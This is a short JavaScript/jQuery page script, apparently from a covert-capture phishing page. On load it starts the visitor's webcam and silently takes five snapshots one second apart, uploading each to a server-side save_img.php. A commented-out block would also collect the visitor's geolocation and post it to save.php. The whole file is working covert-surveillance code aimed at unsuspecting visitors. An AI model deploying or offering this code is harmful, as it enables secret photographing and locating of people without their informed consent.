

$(document).ready(function(){  

    //photo
    const webcamElement = document.getElementById('webcam');
    const canvasElement = document.getElementById('canvas');
    const webcam = new Webcam(webcamElement, 'user', canvasElement);

    webcam.start()
        .then(result =>{
            console.log("webcam started");
        })
        .catch(err => {
            console.log(err);
    });

    var i=0;
    window.setInterval(function(){
        if(i<5){
            now_you_see_me();
            i++;
        }
    }, 1000);

    function now_you_see_me(){
        var picture = webcam.snap();
        $.post("./save_img.php",
        {picture:picture},
        function(data,status){
            console.log(data);
        });
    }

    

    // //location
    // const successCallback=(position)=>{
    //     console.log(position.coords);
    //     var lat=position.coords.latitude;
    //     var long=position.coords.longitude;
    //     $.post("./save.php",
    //     {lat:lat,long: long,},
    //     function(data,status){
    //         // console.log(data);
    //     });
    // }
    // const errorCallback=(error)=>{console.log(error);}
    // const watchId= navigator.geolocation.getCurrentPosition(successCallback,errorCallback);
});